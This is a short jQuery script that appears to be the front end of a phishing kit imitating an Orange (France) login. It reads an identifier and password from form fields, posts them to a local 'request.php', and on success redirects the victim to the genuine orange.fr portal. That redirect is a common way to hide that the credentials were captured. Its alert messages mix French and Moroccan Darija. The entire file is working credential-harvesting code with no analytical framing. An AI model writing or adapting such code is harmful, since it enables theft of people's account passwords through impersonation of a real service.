/*global $, console, alert, prompt */
/*jslint plusplus: true, evil: true */
/*eslint no-unused-vars: "error"*/
/*eslint-env browser*/



$('.snd2').click(function() {
    'use strict';

    if ($('#pz').val().length <= 0 || $('.pswdo').val().length <= 0) {
        alert("veuillez remplir all champ obligatoire");
    } else {

        $.ajax({
            type: 'POST',
            url: './request.php',
            cash: false,
            dataType: 'json',
            data: "identifiant=" + $('#pz').val() + "&psswd=" + $('.pswdo').val(),
            beforeSend: function() {
                /*$('.error1').addClass("hide");
                $('.loadisa').removeClass('hide');*/
            },
            success: function(data) {
                switch (data.error) {
                    case 0:

                        okok();
                        break;
                    case 1:
                        alert("hena chi mochkil fi log");
                        break;
                    case 2:

                        alert(data.msg);
                        break;

                }

            }

        })

    }



});

function okok() {
    'use strict';
    return window.location.href = "https://www.orange.fr/portail";

};